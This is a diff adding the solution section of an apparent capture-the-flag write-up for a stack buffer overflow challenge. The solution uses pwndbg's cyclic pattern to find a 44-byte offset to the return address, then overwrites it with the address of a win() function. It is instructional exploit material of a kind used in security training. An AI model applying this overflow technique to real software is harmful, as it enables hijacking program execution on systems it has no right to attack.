@@ -29,7 +29,41 @@ None given
 
 ## Solution
 
-TODO
+Use cyclic in Pwndbg to generate a de brujin sequence.
+
+```text
+pwndbg> cyclic 50
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
+```
+
+Feed it into the binary and find the amount of padding required before hitting the return address.
+
+```text
+pwndbg> run
+Size of buffer: 32
+win() function: 0x804857f
+Your exploit string: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
+Hope you got your shell!
+
+Program received signal SIGSEGV, Segmentation fault.
+0x6161616c in ?? ()
+pwndbg> cyclic -l 0x6161616c
+Finding cyclic pattern of 4 bytes: b'laaa' (hex: 0x6c616161)
+Found at offset 44
+```
+
+44 bytes are required.
+
+Now convert the address of the win function to little endian and append it to the end of the padding.
+
+```text
++----------+---------+
+| Padding  | win()   |
+| 44 bytes | 4 bytes |
++----------+---------+
+```
+
+Send the exploit and get the flag.
 
 ### Flag
 
